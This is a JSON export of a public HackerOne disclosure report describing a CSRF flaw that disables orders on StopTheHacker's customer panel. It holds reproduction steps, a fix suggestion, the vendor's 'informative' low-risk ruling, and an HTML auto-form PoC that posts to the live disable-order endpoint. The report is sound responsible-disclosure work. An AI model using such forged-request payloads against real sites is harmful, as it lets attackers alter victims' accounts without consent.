{"id":8843,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODQz","url":"https://hackerone.com/reports/8843","title":"CSRF - Disabling orders at https://panel.stopthehacker.com/manage/disable-order/order/ID","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2014-04-21T21:09:59.665Z","submitted_at":"2014-04-21T21:09:59.665Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"internetwache","url":"/internetwache","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":165,"url":"https://hackerone.com/stopthehacker","handle":"stopthehacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/165/6b4d20f08a903f083c9920ff0109356c9649d891_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/165/6b4d20f08a903f083c9920ff0109356c9649d891_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"StopTheHacker","twitter_handle":null,"website":"http://www.stopthehacker.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-07-19T08:43:50.275Z","bug_reporter_agreed_on_going_public_at":"2014-06-19T08:43:45.817Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there,\r\n\r\nthere's a CSRF which would allow an attacker to disable an order.\r\n\r\nHost: https://panel.stopthehacker.com\r\n\r\n#Steps to reproduce:\r\n- 1. Login to the panel.\r\n- 2. Subscribe/order a new scan\r\n- 3. Go to the Billing page and get the order ID\r\n- 4. Put the order id in the PoC below and submit it\r\n- 5. The order will be disabled now. \r\n- 6. Same procedure should work for enabling a service.\r\n\r\nAn attacker would need to guess the order ID by sending some (a lot of) requests.\r\n\r\n#PoC:\r\n\r\n```\r\n\u003chtml\u003e\r\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"https://panel.stopthehacker.com/manage/disable-order/order/240720\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"reason\" value=\"Other\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"otherReason\" value=\"\u0026#45;\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\nYou may need to adjust your order ID in the url. \r\n\r\n#How to fix?\r\nAdd a CSRF token and validate it on the server.\r\n\r\nThanks,\r\nSebastian","vulnerability_information_html":"\u003cp\u003eHi there,\u003c/p\u003e\n\n\u003cp\u003ethere\u0026#39;s a CSRF which would allow an attacker to disable an order.\u003c/p\u003e\n\n\u003cp\u003eHost: \u003ca title=\"https://panel.stopthehacker.com\" href=\"/redirect?url=https%3A%2F%2Fpanel.stopthehacker.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://panel.stopthehacker.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce:\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e1. Login to the panel.\u003c/li\u003e\n\u003cli\u003e2. Subscribe/order a new scan\u003c/li\u003e\n\u003cli\u003e3. Go to the Billing page and get the order ID\u003c/li\u003e\n\u003cli\u003e4. Put the order id in the PoC below and submit it\u003c/li\u003e\n\u003cli\u003e5. The order will be disabled now. \u003c/li\u003e\n\u003cli\u003e6. Same procedure should work for enabling a service.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAn attacker would need to guess the order ID by sending some (a lot of) requests.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC:\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://panel.stopthehacker.com/manage/disable-order/order/240720\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;reason\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Other\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;otherReason\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#45;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou may need to adjust your order ID in the url. \u003c/p\u003e\n\n\u003ch1 id=\"how-to-fix\"\u003eHow to fix?\u003c/h1\u003e\n\n\u003cp\u003eAdd a CSRF token and validate it on the server.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-07-19T08:43:46.026Z","allow_singular_disclosure_after":-203466118.51869705,"singular_disclosure_allowed":true,"vote_count":1,"voters":["sw33tlie"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":46141,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for submitting your report. We are looking into it.","markdown_message":"\u003cp\u003eThank you for submitting your report. We are looking into it.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-05-07T16:47:53.378Z","updated_at":"2014-05-07T16:47:53.378Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"stopthehacker","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":75279,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thank you for your submission.\n\nOur engineers have determined that this is a low, acceptable risk since the user must have valid session, attacker must guess order ID, and the action is non-destructive and can be easily reversed. ","markdown_message":"\u003cp\u003eThank you for your submission.\u003c/p\u003e\n\n\u003cp\u003eOur engineers have determined that this is a low, acceptable risk since the user must have valid session, attacker must guess order ID, and the action is non-destructive and can be easily reversed. \u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-18T14:53:56.558Z","updated_at":"2014-06-18T14:53:56.558Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"stopthehacker","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":75791,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi,\nalright.\n\nThanks,\nSebastian","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nalright.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-19T08:43:45.835Z","updated_at":"2014-06-19T08:43:45.835Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"stopthehacker","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":91930,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-19T08:43:50.479Z","updated_at":"2014-07-19T08:43:50.479Z","actor":{"url":"/stopthehacker","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/165/6b4d20f08a903f083c9920ff0109356c9649d891_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"StopTheHacker"}},"genius_execution_id":null,"team_handle":"stopthehacker","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}